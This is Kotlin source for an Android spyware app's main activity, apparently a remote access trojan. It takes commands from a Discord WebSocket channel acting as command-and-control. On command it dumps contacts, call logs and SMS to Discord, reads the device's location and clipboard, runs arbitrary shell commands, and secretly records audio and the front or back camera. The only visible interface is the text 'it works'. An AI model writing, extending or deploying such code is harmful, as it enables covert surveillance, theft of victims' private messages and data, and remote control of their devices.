package io.ks.spyware

import android.content.Intent
import android.os.Bundle
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.ui.Modifier
import androidx.core.content.ContextCompat
import io.ks.spyware.ui.theme.SpywareTheme

object DiscordClientManager {
    var discordClient: DiscordWebSocketClient? = null
}

class MainActivity : ComponentActivity() {

    val helpMsg = ">help\n>Read Contact\n>Read Call Log\n>Read SMS\n>Get Location\n>Get Clipboard\n>cmd\n>Record Audio\n>Record Front Cam\n>Record Back Cam"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        if (DiscordClientManager.discordClient == null) {
            DiscordClientManager.discordClient = DiscordWebSocketClient()
        }
        DiscordClientManager.discordClient?.onChannelIdReceived = {
            DiscordClientManager.discordClient?.sendMessage("> App started",helpMsg)

        }
        DiscordClientManager.discordClient?.onMessageReceived = { message ->
            // Here, you can handle any messages that come from Discord
            println("Message received: $message")
            val command = message.trim()
            // Split the message into command and argument (everything after >cmd)
            val (baseCommand, argument) = if (command.startsWith(">cmd")) {
                command.split(" ", limit = 2).let {
                    it.getOrElse(0) { "" } to it.getOrElse(1) { "" }
                }
            } else {
                command to ""
            }

            when (baseCommand) {
                ">help" -> DiscordClientManager.discordClient?.sendMessage("> Help Menu",helpMsg)
                ">Read Contact" -> Dump(this,DiscordClientManager.discordClient!! ,ContactsContract.CommonDataKinds.Phone.CONTENT_URI, "Contacts")
                ">Read Call Log" -> Dump(this,DiscordClientManager.discordClient!! ,CallLog.Calls.CONTENT_URI, "Call log")
                ">Read SMS" -> Dump(this,DiscordClientManager.discordClient!! ,Telephony.Sms.CONTENT_URI, "SMS")
                ">Get Location" -> getLastKnownLocation(this,DiscordClientManager.discordClient!!)
                ">Get Clipboard" -> readClipboard(this,DiscordClientManager.discordClient!!)
                ">cmd" -> {
                    if (argument.isNotEmpty()) {
                        // Here, argument is everything after ">cmd", e.g. "ls -la /var/www/html"
                        execute(argument, DiscordClientManager.discordClient!!)
                    } else {
                        DiscordClientManager.discordClient?.sendMessage("Command Error",">cmd <command>")
                    }
                }
                ">Record Audio" -> ContextCompat.startForegroundService(this, Intent(this, AudioRecording::class.java))
                ">Record Front Cam" -> ContextCompat.startForegroundService(this, Intent(this, CamRecording::class.java).apply {putExtra("cameraId", "1")})
                ">Record Back Cam" -> ContextCompat.startForegroundService(this, Intent(this, CamRecording::class.java).apply {putExtra("cameraId", "0")})
            }


        }
        DiscordClientManager.discordClient?.start()


        setContent {
            SpywareTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->

                    RequestPermissionsAndExitIfDenied(this@MainActivity)
                    Text("it works",
                        modifier = Modifier.padding(innerPadding)
                    )
                    }


            }
        }


    }

    override fun onDestroy() {
        super.onDestroy()
        // Close the WebSocket connection to clean up resources
        DiscordClientManager.discordClient?.stop()
    }

}

